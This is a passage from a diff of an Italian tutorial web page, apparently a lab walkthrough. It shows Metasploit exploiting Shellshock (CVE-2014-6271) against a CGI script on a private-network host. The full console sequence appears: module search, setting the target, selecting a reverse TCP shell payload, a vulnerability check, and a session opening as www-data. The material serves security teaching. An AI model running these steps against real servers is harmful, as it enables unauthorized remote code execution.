-</code></pre></div><p>Una reverse TCP shell sarà sufficiente, quindi digitiamo <strong>set payload linux/x86/shell/reverse_tcp</strong> per abilitarla:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; set payload linux/x86/shell/reverse_tcp
-payload <span style="color:#f92672">=</span>&gt; linux/x86/shell/reverse_tcp
-msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
-</code></pre></div><p>Digitiamo di nuovo <strong>options</strong> e possiamo vedere le impostazioni correnti per questo modulo, incluse le informazioni sul payload:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; options 
-
-Module options <span style="color:#f92672">(</span>exploit/multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span>:
-
-   Name            Current Setting    Required  Description
-   ----            ---------------    --------  -----------
-   CMD_MAX_LENGTH  <span style="color:#ae81ff">2048</span>               yes       CMD max line length
-   CVE             CVE-2014-6271      yes       CVE to check/exploit <span style="color:#f92672">(</span>Accepted: CVE-2014-6271, CVE-2014-6278<span style="color:#f92672">)</span>
-   HEADER          User-Agent         yes       HTTP header to use
-   METHOD          GET                yes       HTTP method to use
-   Proxies                            no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
-   RHOSTS          192.168.1.245      yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPATH           /bin               yes       Target PATH <span style="color:#66d9ef">for</span> binaries used by the CmdStager
-   RPORT           <span style="color:#ae81ff">80</span>                 yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
-   SSL             false              no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
-   SSLCert                            no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
-   TARGETURI       /cgi-bin/hello.sh  yes       Path to CGI script
-   TIMEOUT         <span style="color:#ae81ff">5</span>                  yes       HTTP read response timeout <span style="color:#f92672">(</span>seconds<span style="color:#f92672">)</span>
-   URIPATH                            no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
-   VHOST                              no        HTTP server virtual host
-
-   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
-
-   Name     Current Setting  Required  Description
-   ----     ---------------  --------  -----------
-   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
-   SRVPORT  <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
-
-Payload options <span style="color:#f92672">(</span>linux/x86/shell/reverse_tcp<span style="color:#f92672">)</span>:
-
-   Name   Current Setting  Required  Description
-   ----   ---------------  --------  -----------
-   LHOST  192.168.1.176    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
-   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
-
-Exploit target:
-
-   Id  Name
-   --  ----
-   <span style="color:#ae81ff">0</span>   Linux x86
-
-View the full module info with the info, or info -d command.
-</code></pre></div><p>Alcuni moduli Metasploit hanno una piccola funzione utile che controllerà se il bersaglio è vulnerabile. Digitiamo <strong>check</strong>, se il modulo lo consente, verranno visualizzate le informazioni sulla vulnerabilità o meno del bersaglio:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; check 
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> 192.168.1.245:80 - The target is vulnerable.
-msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
-</code></pre></div><p>Possiamo vedere che il bersaglio è davvero vulnerabile, quindi usiamo il comando <strong>exploit</strong> per lanciare l&rsquo;attacco. Viene aperta una sessione di shell e ora possiamo eseguire comandi come <strong>id</strong> e <strong>whoami</strong> per visualizzare le informazioni sull&rsquo;utente corrente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; exploit 
-
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.1.176:4444 
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command Stager progress - 100.00% <span style="color:#66d9ef">done</span> <span style="color:#f92672">(</span>1092/1092 bytes<span style="color:#f92672">)</span>
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">36</span> bytes<span style="color:#f92672">)</span> to 192.168.1.245
-<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Command shell session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.1.176:4444 -&gt; 192.168.1.245:34196<span style="color:#f92672">)</span> at 2023-07-18 22:19:53 +0200
-
-id
-uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
-whoami
-www-data
-</code></pre></div><h1 id="privilage-escalation">Privilage Escalation<a href="#privilage-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfconsole
+</span></span><span style="display:flex;"><span>                                                  
+</span></span><span style="display:flex;"><span>%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+</span></span><span style="display:flex;"><span>%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+</span></span><span style="display:flex;"><span>%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+</span></span><span style="display:flex;"><span>%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+</span></span><span style="display:flex;"><span>%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+</span></span><span style="display:flex;"><span>%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       <span style="color:#f92672">=[</span> metasploit v6.3.21-dev                          <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">2329</span> exploits - <span style="color:#ae81ff">1223</span> auxiliary - <span style="color:#ae81ff">413</span> post       <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">1385</span> payloads - <span style="color:#ae81ff">46</span> encoders - <span style="color:#ae81ff">11</span> nops           <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+ -- --<span style="color:#f92672">=[</span> <span style="color:#ae81ff">9</span> evasion                                       <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Metasploit tip: You can upgrade a shell to a Meterpreter 
+</span></span><span style="display:flex;"><span>session on many platforms using sessions -u 
+</span></span><span style="display:flex;"><span>&lt;session_id&gt;
+</span></span><span style="display:flex;"><span>Metasploit Documentation: https://docs.metasploit.com/
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf6 &gt;
+</span></span></code></pre></div><p>Possiamo facilmente cercare exploit utilizzando il comando di <strong>search</strong>. Digitiamo <strong>search shellshock</strong>, individuiamo il modulo <strong>apache_mod_cgi_bash_env_exec</strong> e copiamo il percorso:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; search shellshock
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Matching Modules
+</span></span><span style="display:flex;"><span><span style="color:#f92672">================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                               Disclosure Date  Rank       Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                               ---------------  ----       -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   exploit/linux/http/advantech_switch_bash_env_exec  2015-12-01       excellent  Yes    Advantech Switch Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   exploit/multi/http/apache_mod_cgi_bash_env_exec    2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   auxiliary/scanner/http/apache_mod_cgi_bash_env     2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span> Scanner
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   exploit/multi/http/cups_bash_env_exec              2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   auxiliary/server/dhclient_bash_env                 2014-09-24       normal     No     DHCP Client Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   exploit/unix/dhcp/bash_environment                 2014-09-24       excellent  No     Dhclient Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   exploit/linux/http/ipfire_bashbug_exec             2014-09-29       excellent  Yes    IPFire Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   exploit/multi/misc/legend_bot_exec                 2015-04-27       excellent  Yes    Legend Perl IRC Bot Remote Code Execution
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   exploit/osx/local/vmware_bash_function_root        2014-09-24       normal     Yes    OS X VMWare Fusion Privilege Escalation via Bash Environment Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   exploit/multi/ftp/pureftpd_bash_env_exec           2014-09-24       excellent  Yes    Pure-FTPd External Authentication Bash Environment Variable Code Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">10</span>  exploit/unix/smtp/qmail_bash_env_exec              2014-09-24       normal     No     Qmail SMTP Bash Environment Variable Injection <span style="color:#f92672">(</span>Shellshock<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">11</span>  exploit/multi/misc/xdh_x_exec                      2015-12-04       excellent  Yes    Xdh / LinuxNet Perlbot / fBot IRC Bot Remote Code Execution
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Interact with a module by name or index. For example info 11, use <span style="color:#ae81ff">11</span> or use exploit/multi/misc/xdh_x_exec
+</span></span></code></pre></div><p>Carichiamo questo exploit digitando <strong>use</strong> seguito dalla posizione che abbiamo precedentemente copiato. Ora dovrebbe esserci un prompt più lungo che indica il modulo attualmente caricato:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 &gt; use exploit/multi/http/apache_mod_cgi_bash_env_exec
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Digitiamo <strong>options</strong> per vedere le varie impostazioni per questo modulo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; options 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Module options <span style="color:#f92672">(</span>exploit/multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name            Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----            ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   CMD_MAX_LENGTH  <span style="color:#ae81ff">2048</span>             yes       CMD max line length
+</span></span><span style="display:flex;"><span>   CVE             CVE-2014-6271    yes       CVE to check/exploit <span style="color:#f92672">(</span>Accepted: CVE-2014-6271, CVE-2014-6278<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   HEADER          User-Agent       yes       HTTP header to use
+</span></span><span style="display:flex;"><span>   METHOD          GET              yes       HTTP method to use
+</span></span><span style="display:flex;"><span>   Proxies                          no        A proxy chain of format type:host:port<span style="color:#f92672">[</span>,type:host:port<span style="color:#f92672">][</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>   RHOSTS                           yes       The target host<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+</span></span><span style="display:flex;"><span>   RPATH           /bin             yes       Target PATH <span style="color:#66d9ef">for</span> binaries used by the CmdStager
+</span></span><span style="display:flex;"><span>   RPORT           <span style="color:#ae81ff">80</span>               yes       The target port <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   SSL             false            no        Negotiate SSL/TLS <span style="color:#66d9ef">for</span> outgoing connections
+</span></span><span style="display:flex;"><span>   SSLCert                          no        Path to a custom SSL certificate <span style="color:#f92672">(</span>default is randomly generated<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   TARGETURI                        yes       Path to CGI script
+</span></span><span style="display:flex;"><span>   TIMEOUT         <span style="color:#ae81ff">5</span>                yes       HTTP read response timeout <span style="color:#f92672">(</span>seconds<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   URIPATH                          no        The URI to use <span style="color:#66d9ef">for</span> this exploit <span style="color:#f92672">(</span>default is random<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   VHOST                            no        HTTP server virtual host
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name     Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----     ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span style="display:flex;"><span>   SRVPORT  <span style="color:#ae81ff">8080</span>             yes       The local port to listen on.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Payload options <span style="color:#f92672">(</span>linux/x86/meterpreter/reverse_tcp<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Name   Current Setting  Required  Description
+</span></span><span style="display:flex;"><span>   ----   ---------------  --------  -----------
+</span></span><span style="display:flex;"><span>   LHOST  192.168.1.176    yes       The listen address <span style="color:#f92672">(</span>an interface may be specified<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   LPORT  <span style="color:#ae81ff">4444</span>             yes       The listen port
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Exploit target:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   Id  Name
+</span></span><span style="display:flex;"><span>   --  ----
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   Linux x86
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>View the full module info with the info, or info -d command.
+</span></span></code></pre></div><p>Possiamo lasciare la maggior parte delle impostazioni predefinite, ma dovremo impostare l&rsquo;host remoto sull&rsquo;indirizzo IP della destinazione e l&rsquo;URI di destinazione sul file che abbiamo inserito nella directory /cgi-bin, in questo modo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.1.245
+</span></span><span style="display:flex;"><span>RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.1.245
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; set TARGETURI /cgi-bin/hello.sh
+</span></span><span style="display:flex;"><span>TARGETURI <span style="color:#f92672">=</span>&gt; /cgi-bin/hello.sh
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Successivamente, dobbiamo scegliere un payload. Digitiamo <strong>show payloads</strong> per visualizzare i diversi payload e le informazioni relative a ciascuno di essi:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; show payloads
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Compatible Payloads
+</span></span><span style="display:flex;"><span><span style="color:#f92672">===================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#75715e">#   Name                                              Disclosure Date  Rank    Check  Description</span>
+</span></span><span style="display:flex;"><span>   -   ----                                              ---------------  ----    -----  -----------
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0</span>   payload/generic/custom                                             normal  No     Custom Payload
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1</span>   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2</span>   payload/generic/shell_bind_aws_ssm                                 normal  No     Command Shell, Bind SSM <span style="color:#f92672">(</span>via AWS API<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">3</span>   payload/generic/shell_bind_tcp                                     normal  No     Generic Command Shell, Bind TCP Inline
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4</span>   payload/generic/shell_reverse_tcp                                  normal  No     Generic Command Shell, Reverse TCP Inline
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5</span>   payload/generic/ssh/interact                                       normal  No     Interact with Established SSH Connection
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">6</span>   payload/generic/tight_loop                                         normal  No     Generic x86 Tight Loop
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">7</span>   payload/linux/x86/chmod                                            normal  No     Linux Chmod
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">8</span>   payload/linux/x86/exec                                             normal  No     Linux Execute Command
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">9</span>   payload/linux/x86/meterpreter/bind_ipv6_tcp                        normal  No     Linux Mettle x86, Bind IPv6 TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">10</span>  payload/linux/x86/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Linux Mettle x86, Bind IPv6 TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">11</span>  payload/linux/x86/meterpreter/bind_nonx_tcp                        normal  No     Linux Mettle x86, Bind TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">12</span>  payload/linux/x86/meterpreter/bind_tcp                             normal  No     Linux Mettle x86, Bind TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">13</span>  payload/linux/x86/meterpreter/bind_tcp_uuid                        normal  No     Linux Mettle x86, Bind TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">14</span>  payload/linux/x86/meterpreter/reverse_ipv6_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">15</span>  payload/linux/x86/meterpreter/reverse_nonx_tcp                     normal  No     Linux Mettle x86, Reverse TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">16</span>  payload/linux/x86/meterpreter/reverse_tcp                          normal  No     Linux Mettle x86, Reverse TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">17</span>  payload/linux/x86/meterpreter/reverse_tcp_uuid                     normal  No     Linux Mettle x86, Reverse TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">18</span>  payload/linux/x86/metsvc_bind_tcp                                  normal  No     Linux Meterpreter Service, Bind TCP
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">19</span>  payload/linux/x86/metsvc_reverse_tcp                               normal  No     Linux Meterpreter Service, Reverse TCP Inline
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">20</span>  payload/linux/x86/read_file                                        normal  No     Linux Read File
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">21</span>  payload/linux/x86/shell/bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind IPv6 TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">22</span>  payload/linux/x86/shell/bind_ipv6_tcp_uuid                         normal  No     Linux Command Shell, Bind IPv6 TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">23</span>  payload/linux/x86/shell/bind_nonx_tcp                              normal  No     Linux Command Shell, Bind TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">24</span>  payload/linux/x86/shell/bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Stager <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">25</span>  payload/linux/x86/shell/bind_tcp_uuid                              normal  No     Linux Command Shell, Bind TCP Stager with UUID Support <span style="color:#f92672">(</span>Linux x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">26</span>  payload/linux/x86/shell/reverse_ipv6_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">27</span>  payload/linux/x86/shell/reverse_nonx_tcp                           normal  No     Linux Command Shell, Reverse TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">28</span>  payload/linux/x86/shell/reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">29</span>  payload/linux/x86/shell/reverse_tcp_uuid                           normal  No     Linux Command Shell, Reverse TCP Stager
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">30</span>  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">31</span>  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">32</span>  payload/linux/x86/shell_bind_tcp_random_port                       normal  No     Linux Command Shell, Bind TCP Random Port Inline
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">33</span>  payload/linux/x86/shell_reverse_tcp                                normal  No     Linux Command Shell, Reverse TCP Inline
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">34</span>  payload/linux/x86/shell_reverse_tcp_ipv6                           normal  No     Linux Command Shell, Reverse TCP Inline <span style="color:#f92672">(</span>IPv6<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Una reverse TCP shell sarà sufficiente, quindi digitiamo <strong>set payload linux/x86/shell/reverse_tcp</strong> per abilitarla:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt; set payload linux/x86/shell/reverse_tcp
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span>&gt; linux/x86/shell/reverse_tcp
+</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/http/apache_mod_cgi_bash_env_exec<span style="color:#f92672">)</span> &gt;
+</span></span></code></pre></div><p>Digitiamo di nuovo <strong>options</strong> e possiamo vedere le impostazioni correnti per questo modulo, incluse le informazioni sul payload:</p>
